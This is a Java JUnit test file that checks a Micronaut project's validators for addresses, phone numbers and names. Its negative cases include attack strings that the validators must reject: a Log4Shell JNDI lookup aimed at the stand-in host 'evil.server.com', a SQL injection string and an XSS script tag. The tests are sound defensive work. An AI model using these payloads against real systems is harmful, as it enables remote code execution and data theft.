package world.deslauriers.validation;

import io.micronaut.test.extensions.junit5.annotation.MicronautTest;
import io.micronaut.validation.validator.Validator;
import jakarta.inject.Inject;
import org.junit.jupiter.api.Test;
import world.deslauriers.model.database.Address;
import world.deslauriers.model.database.Phone;

import java.util.ArrayList;
import java.util.Arrays;

import static org.junit.jupiter.api.Assertions.assertEquals;

@MicronautTest
public class ValidationsTest {

    @Inject
    Validator validator;

    public static final String STREET = "123 S. Main Street, Unit 555";
    public static final String CITY = "Big City";
    public static final String STATE = "CA";
    public static final String ZIP = "55555";

    public static final String PHONE = "1112223333";
    public static final String TYPE = "CELL";

    @Test
    void testUsStateAnnotation(){

        var fail = validator.validate(new Address(STREET, CITY, "QQ", ZIP));
        assertEquals(1, fail.size());

        var pass = validator.validate(new Address(STREET, CITY, STATE, ZIP));
        assertEquals(0, pass.size());
    }

    @Test
    void testValidPhoneType(){

        var fail = validator.validate(new Phone(PHONE, "FAIL"));
        assertEquals(1, fail.size());

        var pass = validator.validate(new Phone(PHONE, TYPE));
        assertEquals(0, pass.size());
    }

    @Test
    void testNumbersOnly(){

        // 5 letters
        var fail = validator.validate(new Address(STREET, CITY, STATE, "w0rds"));
        assertEquals(1, fail.size());

        var pass = validator.validate(new Address(STREET, CITY, STATE, ZIP));
        assertEquals(0, pass.size());

        var bad = validator.validate(new Phone("N0t numb3r", TYPE));
        assertEquals(1, bad.size());

        var good = validator.validate(new Phone(PHONE, TYPE));
        assertEquals(0, good.size());
    }

    @Test
    void testLettersOnly(){

        var good = new ArrayList<>(Arrays.asList("Tom", "O'Connor", "des Lauriers", "Smith-Jones", "St. Pierre"));
        good.forEach(name -> {
            var pass = validator.validate(new NameTest(name));
            System.out.println(name);
            assertEquals(0, pass.size());
        });

        var bad = new ArrayList<>(Arrays.asList( "TomsNum1", "Toms#One", " Tom", "${jndi:ldap:\\\\}", "F#@^",
                "' or 1=1;--", "<script>alert(1)</script>", "'tom"));
        bad.forEach(name -> {
            var fail = validator.validate(new NameTest(name));
            System.out.println(name);
            assertEquals(1, fail.size());
        });
    }

    @Test
    void testNoSpecialChars(){

        var fail = validator.validate(new Address("${jndi:ldap:\\\\evil.server.com}", CITY, STATE, ZIP));
        assertEquals(1, fail.size());

        var pass = validator.validate(new Address(STREET, CITY, STATE, ZIP));
        assertEquals(0, pass.size());
    }
}

